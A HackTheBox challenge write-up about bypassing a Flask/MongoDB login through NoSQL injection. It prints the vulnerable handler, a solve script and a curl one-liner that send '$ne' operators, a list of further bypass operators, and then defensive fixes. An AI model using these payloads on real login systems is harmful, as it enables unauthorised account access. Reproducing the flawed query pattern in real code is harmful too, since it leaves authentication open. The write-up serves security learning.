---
title: "CandyVault"
date: 2026-10-09 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nosql, mongodb, nosql-injection, auth-bypass]
description: "A Very Easy Web challenge: a Flask login queries MongoDB with the raw request fields and accepts a JSON body. Send query operators instead of strings and the password check collapses into a match-anything filter - a textbook MongoDB NoSQL injection auth bypass that renders the flag in one request."
---

## Overview

`CandyVault` is a Very Easy HackTheBox **Web** challenge. A small Flask app stores users in
MongoDB and exposes a single `POST /login` endpoint. The handler drops the request's email
and password straight into a `find_one` query and accepts a JSON body, so an attacker can
swap the credential strings for MongoDB query operators and authenticate as a seeded user
without knowing any password. One request renders the flag.

## The technique

The login endpoint builds its database query directly from user input and branches on whether
a matching document exists:

```python
@app.route("/login", methods=["POST"])
def login():
    content_type = request.headers.get("Content-Type")
    if content_type == "application/json":
        data = request.get_json()
        email = data.get("email")
        password = data.get("password")
    ...
    user = users_collection.find_one({"email": email, "password": password})
    if user:
        return render_template("candy.html", flag=open("flag.txt").read())
```

With a form-encoded body, `email` and `password` are always **strings**, so the query is a
literal equality match and you would need real credentials. But with
`Content-Type: application/json`, the JSON parser lets those values be **objects** — and
MongoDB treats keys beginning with `$` as query operators. That turns a value the developer
expected to be data into a query fragment the attacker controls: a [NoSQL injection](https://cwe.mitre.org/data/definitions/943.html)
([CWE-943](https://cwe.mitre.org/data/definitions/943.html)).

The app seeds ten users with random passwords nobody knows, but we don't need a password —
only a document that matches. Sending `{"$ne": null}` ("not equal to null") for both fields
makes the filter match every seeded user, so `find_one` returns the first one and `if user:`
is true.

## Solution

Send the JSON body with both fields replaced by the `$ne` operator.

Create `solve.py`:

```python
#!/usr/bin/env python3
import re, sys, requests
base = sys.argv[1] if len(sys.argv) > 1 else "http://TARGET:PORT"
payload = {"email": {"$ne": None}, "password": {"$ne": None}}
r = requests.post(f"{base}/login", json=payload, timeout=15)
m = re.search(r"HTB\{[^}]+\}", r.text)
print("FLAG:", m.group(0) if m else "(not found)")
```

Run it against the live instance:

```bash
python3 solve.py http://TARGET:PORT
# FLAG: HTB{...}
```

Equivalent one-liner with `curl`:

```bash
curl -s -X POST http://TARGET:PORT/login -H 'Content-Type: application/json' \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}' | grep -oE 'HTB\{[^}]+\}'
```

Other operators that bypass the same way: `{"$gt": ""}`, `{"$regex": ".*"}`, `{"$exists": true}`.

## Why it worked

The application trusts the *type* of the JSON values. A string `email` is harmless data; an
object `email` is an injected query operator — and the MongoDB driver can't tell which keys
were typed by the user and which were written by the developer, because they share one query
document. The password is never hashed or compared in a separate step; it is just another key
in the same filter, so bypassing it needs no cracking, only a tautological operator.

## Fix / defense

- **Validate types before querying** — reject non-string credentials:
  `if not isinstance(email, str) or not isinstance(password, str): abort(400)`.
- **Never put raw user input into the query document.** Look up the user by email only, then
  verify the password separately with a constant-time check such as
  `bcrypt.check_password_hash(stored_hash, password)` — and never store or compare plaintext.
- Optionally strip operator-significant characters (leading `$`/`.`) from keys, as
  `mongo-sanitize`-style helpers do.
